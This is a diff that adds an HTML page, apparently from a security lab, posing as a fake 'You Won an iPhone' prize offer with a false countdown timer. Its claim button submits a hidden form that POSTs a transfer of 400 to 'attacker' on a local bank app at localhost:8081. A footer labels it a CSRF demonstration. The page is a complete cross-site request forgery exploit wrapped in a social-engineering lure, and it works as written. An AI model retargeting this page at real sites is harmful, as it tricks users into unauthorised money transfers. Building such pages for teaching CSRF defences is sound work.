@@ -1,0 +1,207 @@
+
+<!doctype html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>🎉 Congratulations! You Won!</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 50px;
+            max-width: 600px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            animation: slideIn 0.5s ease-out;
+        }
+        
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .prize-icon {
+            font-size: 100px;
+            margin-bottom: 20px;
+            animation: bounce 2s infinite;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+        
+        h1 {
+            color: #333;
+            font-size: 36px;
+            margin-bottom: 15px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .subtitle {
+            color: #666;
+            font-size: 18px;
+            margin-bottom: 30px;
+        }
+        
+        .prize-details {
+            background: #f8f9ff;
+            border-left: 4px solid #667eea;
+            padding: 20px;
+            margin: 30px 0;
+            border-radius: 10px;
+            text-align: left;
+        }
+        
+        .prize-details h3 {
+            color: #667eea;
+            margin-bottom: 10px;
+        }
+        
+        .prize-details ul {
+            list-style: none;
+            padding-left: 0;
+        }
+        
+        .prize-details li {
+            padding: 8px 0;
+            color: #555;
+        }
+        
+        .prize-details li:before {
+            content: "✓ ";
+            color: #667eea;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+        
+        .claim-button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 18px 60px;
+            font-size: 20px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 20px;
+        }
+        
+        .claim-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.6);
+        }
+        
+        .claim-button:active {
+            transform: translateY(-1px);
+        }
+        
+        .timer {
+            color: #e74c3c;
+            font-weight: bold;
+            font-size: 16px;
+            margin-top: 20px;
+            animation: pulse 1s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+        
+        .disclaimer {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+            color: #999;
+            font-size: 12px;
+            font-style: italic;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="prize-icon">🎁📱</div>
+        <h1>🎉 CONGRATULATIONS! 🎉</h1>
+        <p class="subtitle">You've been selected as our lucky winner!</p>
+        
+        <div class="prize-details">
+            <h3>Your Prize Package:</h3>
+            <ul>
+                <li>Brand New iPhone 16 Pro Max</li>
+                <li>256GB Storage - Space Black</li>
+                <li>1 Year AppleCare+ Protection</li>
+                <li>Premium Accessories Bundle</li>
+                <li>Free Shipping Worldwide</li>
+            </ul>
+        </div>
+        
+        <p style="color: #333; font-size: 16px;">
+            Click the button below to claim your prize now!
+        </p>
+        
+        <a href="#" class="claim-button" onclick="document.getElementById('f').submit(); return false;">
+            🎁 CLAIM MY PRIZE NOW
+        </a>
+        
+        <p class="timer">⏰ Offer expires in: 10:00 minutes</p>
+        
+        <!-- This hidden form submits a POST request to the bank app when clicked -->
+        <form id="f" action="http://localhost:8081/transfer" method="POST" style="display:none">
+            <input name="to" value="attacker">
+            <input name="amount" value="400">
+        </form>
+        
+        <p class="disclaimer">
+            Note: This is a CSRF attack demonstration. In a real attack scenario, 
+            clicking this button would transfer money without the user's knowledge.
+        </p>
+    </div>
+    
+    <script>
+        // Add countdown timer
+        let timeLeft = 600; // 10 minutes
+        const timerElement = document.querySelector('.timer');
+        
+        setInterval(() => {
+            timeLeft--;
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            timerElement.innerHTML = `⏰ Offer expires in: ${minutes}:${seconds.toString().padStart(2, '0')} minutes`;
+            
+            if (timeLeft <= 0) {
+                timeLeft = 600;
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
